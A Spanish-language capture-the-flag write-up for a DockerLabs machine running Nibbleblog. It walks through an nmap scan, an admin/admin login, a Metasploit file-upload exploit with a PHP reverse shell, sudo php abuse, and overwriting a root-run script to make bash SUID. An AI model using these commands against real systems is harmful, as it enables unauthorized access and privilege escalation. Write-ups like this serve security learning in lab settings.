# Fase 1- Tanteo

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/3b1baeed-469f-4cf9-93b2-1f82501df7b5)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.
### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

1. **80/tcp(HTTP):** Apache 2.4.41 (Ubuntu)
### Puerto 80
Al identificar que el puerto 80 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador. Esto llevó a acceder a una pagina por defecto de Apache Ubuntu.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/6dd93135-63f2-4af5-917f-73296165927a)

# Fase 2- Exploración

#### Feroxbuster
Realizando Fuzzing no se encontró absolutamente nada.

#### Codigo
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/ca79133c-8725-4e93-a508-ab5dd5689033)

Al hacer **CTRL+U** para revisar el codigo nos encontramos con algo interesante... Un directorio llamado **/nibbleblog**.

#### Nibbleblog
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/e4528d79-4128-467b-aa4a-88f6e456467f)

Al entrar a Nibbleblog nos encontramos con una especie de blog.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/b4655386-ba77-4a9c-9928-da37efa929f7)

Mirando mas de cerca encontramos este enlace `http://172.17.0.2/nibbleblog/admin.php`.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/063ba0cb-c979-41b8-afbd-10164aba614b)

Al entrar es un inicio de sesión. Probamos las credenciales `admin` `admin` y estamos dentro como usuario administrador.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/9a7b9ae1-7d3f-4bed-a1d4-61d36f78549b)

Explorando encontramos la versión utilizada de Nibbleblog.

# Fase 3- Explotación

#### Searchsploit
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/1f1bbf96-b5e1-4903-aa13-5936f8a17346)

Usando la herramienta `searchsploit` encontramos que es vulnerable a `File Upload`.

#### MsfConsole

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/82b5508d-0391-420a-b992-d06f901d35e0)

Estamos dentro! Al principio nos daba un error pero era porque el script aprovecha un plugin que no tenia instalado. Era instalarlo y listo. 
Lista De Comandos:
```ruby
msfconsole
use exploit/multi/http/nibbleblog_file_upload
set PASSWORD admin
set USERNAME admin
set RHOSTS 172.17.0.2
set TARGETURI /nibbleblog/
exploit
```

#### Shell
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/e4fc6088-3661-48e6-97a8-2f6eb560c944)

Subimos una revershell hecha en php desde msfconsole meterpreter para tener la shell a la que estoy acostumbrado y la ejecuto desde el directorio donde la subí desde el navegador.

# Fase 4- Privilegios
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/4ba9a480-a951-4933-aa2c-542bd8bfcb24)

Despues de hacer el tratamiento de la TTY. Ejecutamos el comando `sudo -l` y vemos que tenemos permisos de ejecución del binario `php`.

#### PHP
Abusamos de este:

```shell
CMD="/bin/bash"
sudo -u chocolate /usr/bin/php -r "system('$CMD');"
```

Si listamos los procesos que están corriendo en el sistema. Podemos ver que **root** está ejecutando un script sospechoso:

```shell
ps -faux
----------------------------
root   1  0.0  0.0   2616  1712 ?   Ss   13:15   0:00 /bin/sh -c service apache2 start && while true; do php /opt/script.php; sleep 5; done
```

Si listamos sus permisos vemos que pertenece al usuario **chocolate**:

```shell
ls -l /opt/script.php
------------------------------
-rw-r--r-- 1 chocolate chocolate 59 May  7 13:55 /opt/script.php
```

Podremos cambiarlo a nuestro antojo para ejecutar algo como el usuario **root**:

```shell
echo '<?php exec("chmod u+s /bin/bash"); ?>' > /opt/script.php
```

Y tras esperar un poco:

```shell
ls -l /bin/bash
----------------------------
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

Vemos que la bash ya es **SUID** por lo que podemos escalar privilegios.

```shell
bash -p
whoami
----------------
root
```

Hemos alcanzado el nivel de privilegios máximos en el sistema!
